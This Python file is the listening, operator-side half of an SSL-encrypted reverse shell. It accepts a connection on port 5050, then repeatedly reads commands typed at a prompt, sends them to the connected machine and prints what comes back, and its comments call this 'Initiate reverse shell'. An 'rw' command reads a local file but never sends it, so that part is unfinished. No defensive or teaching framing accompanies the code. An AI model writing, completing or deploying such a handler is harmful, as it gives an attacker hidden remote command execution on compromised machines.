import socket
import os
import sys
import ssl

# constants
SERVER_HOST = sys.argv[1] # "0.0.0.0" for localhost
SERVER_PORT = 5050
BUFFER_SIZE = 1024

key = "openssl/priv.pem"
certificate = "openssl/cert.crt"
def main():

    '''
    create socket object
    bind the socket to all IP addresses of this host
    begins listening for connection and accepts when a connection is found
    '''

    s = socket.socket()
    s.bind((SERVER_HOST, SERVER_PORT))
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.listen(5)

    s_ssl = ssl.wrap_socket(s, keyfile=key, certfile=certificate, server_side=True)

    print(f"Listening as {SERVER_HOST}:{SERVER_PORT} ...")
    client_socket, client_address = s_ssl.accept()
    print(f"Connected to {client_address[0]}:{client_address[1]}!")

    '''
    Initiate reverse shell
    Issue commands until "exit" is typed"
    '''
    while True:
        # Print current working directory
        print("\nCurrent directory: " + str(os.getcwd()))
        command = input("Enter command: ")

        # send the command to the client
        client_socket.send(command.encode('ISO-8859-1'))
        if command.lower() == "rw":
            filetosend = open("test.py", "rb")
            data = filetosend.read(1024)
        if command.lower() == "exit":
            break

        # retrieve command results
        results = client_socket.recv(BUFFER_SIZE).decode('ISO-8859-1')
        print(results)
        continue

    # close connections
    client_socket.close()
    s_ssl.close()

if __name__ == "__main__":
    main()